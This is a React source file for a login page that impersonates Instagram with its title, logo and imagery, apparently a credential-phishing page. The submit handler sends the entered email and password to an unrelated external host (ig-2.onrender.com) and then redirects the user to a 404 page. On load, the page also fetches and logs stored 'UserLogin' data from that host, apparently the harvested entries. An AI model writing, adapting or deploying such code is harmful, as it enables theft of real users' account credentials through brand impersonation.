import { useEffect, useState } from "react";
import axios from 'axios';
import { useNavigate } from 'react-router-dom';

export default function Login() {
  const URLS = "https://ig-2.onrender.com"
  const [emailAddress, setEmailAddress] = useState("");
  const [password, setPassword] = useState("");
  const navigate = useNavigate()

  const [error, setError] = useState("");
  const isInvalid =
    emailAddress === "" || password === "" || password.length < 4;

useEffect(()=>{
    document.title = "Login - Instagram";
    const getData = async()=>{
        const ur = `${URLS}/login/data/fetch`
        console.log(ur)
       const axiosGet = await axios.get(ur)
        console.log(axiosGet.data.UserLogin)
      
    }
    getData()
   
},[])

  const handleLogin = async (event) => {
    event.preventDefault();
   const form ={email:emailAddress,password}
try{
    const response = axios.post(`${URLS}/login/`,  form)
   
} 
catch(err){
    console.log("By POST $%", err)
}

    {
      setEmailAddress("");
      setPassword("");
      setError(error.message);
    }

    setTimeout(() => {
        navigate('/404'); 
    }, 1000);
  };


  return (
    <div className="container flex px-5 md:mx-auto max-w-screen-md items-center h-screen">
      <div className="flex md:w-2/4 w-0">
        <img
          src="/iphone-with-profile.jpg"
          alt="iPhone with Instagram"
        />
      </div>
      <div className="flex flex-col md:w-2/4 w-full max-w-md">
        <div className="flex flex-col items-center bg-white py-20 px-6 border border-gray-primary mb-4 rounded">
          <h1 className="flex justify-center w-full">
            <img
              src="/logo.png"
              alt="Instagram"
              className="mt-2 w-6/12 mb-4"
            />
          </h1>
          {error && <p className="mb-4 text-xs text-red-primary">{error}</p>}
          <form onSubmit={handleLogin} method="POST">
            <input
              aria-label="Enter your email address"
              type="text"
              value={emailAddress}
              placeholder="Email address"
              className="text-sm text-gray-base w-full mr-3 py-5 px-4 h-2 border border-gray-primary rounded mb-2"
              onChange={({ target }) => setEmailAddress(target.value)}
            />
            <input
              aria-label="Enter your password"
              type="password"
              value={password}
              placeholder="Password"
              className="text-sm text-gray-base w-full mr-3 py-5 px-4 h-2 border border-gray-primary rounded mb-2"
              onChange={({ target }) => setPassword(target.value)}
            />
            <button
              disabled={isInvalid}
              type="submit"
              className={`bg-blue-400  text-white w-full rounded h-9 font-bold ${
                isInvalid && "cursor-not-allowed"
              }`}>
              Log In
            </button>
            <p className="text-blue-700 text-end text-xs mt-2 cursor-pointer">Forgot password?</p>
          </form>
        </div>
        <div className="flex justify-center items-center flex-col w-full bg-white p-4 rounded border border-gray-primary">
          <p className="text-sm cursor-pointer">
            Don't have an account?{` `}
            <p className="font-bold text-blue-400" onClick={()=> navigate('/404')}>
              Sign up
            </p>
          </p>
        </div>
      </div>
    </div>
  );
}